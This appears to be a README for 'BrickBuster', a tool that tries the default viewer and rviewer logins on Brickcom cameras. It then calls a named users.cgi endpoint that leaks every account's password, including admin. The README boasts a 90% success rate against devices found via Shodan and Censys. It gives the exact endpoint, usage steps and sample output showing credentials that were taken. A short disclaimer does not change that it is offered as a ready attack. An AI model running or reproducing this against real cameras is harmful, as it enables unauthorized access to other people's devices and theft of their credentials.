# BrickBuster
## _"A highly effective pentesting tool for detecting unchanged default credentials on Brickcom cameras." -DoomerToChad_

**BrickBuster** is a security testing tool designed to quickly check for default login vulnerabilities in **Brickcom** cameras.
Many of these devices remain misconfigured, leaving them open to unauthorized access.
- Over 90% success rate when tested on **Shodan** and **Censys**
- Works instantly, no need for traditional bruteforcing
- Retrieves full admin credentials if successful

Most **Brickcom** devices come with three default accounts:
- **admin**
- **viewer**
- **rviewer**
  
Even when **admin** passwords are changed, the **viewer** and **rviewer** accounts are almost always left unchanged.
If access is gained, **BrickBuster** prints all login details including **admin** credentials via a vulnerability
in api authorization where ALL users including **viewer** and **rviewer** can access the global user config.

`/cgi-bin/users.cgi?action=getUsers`

## Usage:
- Prepare a .txt file with the IP and PORT of the *Brickcam* device/s laid out line by line just like in the example.

  ```bash
  192.168.0.1 5001
  192.168.0.1 5002
  192.168.0.1 5003
  ```
- After your .txt file is prepared, simply run the script with the file as its argument and it will iterate through each ip and bruteforce it with the 3 default hashes.

`./BrickBuster file.txt`

- Upon success, it will print out the passwords of the other accounts.

  ```bash
  Testing IP: 69.69.69.69 on Port: 9999
  Authentication failed for: YWRtaW46YWRtaW4=
  User: admin, Password: diddyparty
  User: viewer, Password: viewer
  User: rviewer, Password: rviewer
  ```

## Disclaimer:

*This tool is for authorized security testing and educational use only. Do not use it on systems without explicit permission.*

  
